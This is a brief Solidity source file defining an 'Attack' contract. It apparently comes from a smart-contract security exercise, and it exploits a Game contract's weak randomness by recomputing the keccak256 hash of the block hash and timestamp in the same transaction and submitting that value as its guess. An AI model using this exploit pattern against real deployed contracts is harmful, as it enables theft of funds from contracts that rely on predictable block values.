//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
import "./Game.sol";

contract Attack{
    Game game;

    constructor(address gameAddress){
        game = Game(gameAddress);
    }

    function attack() public {
        uint guessNo = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(guessNo);
    }

    receive() external payable{}
    
}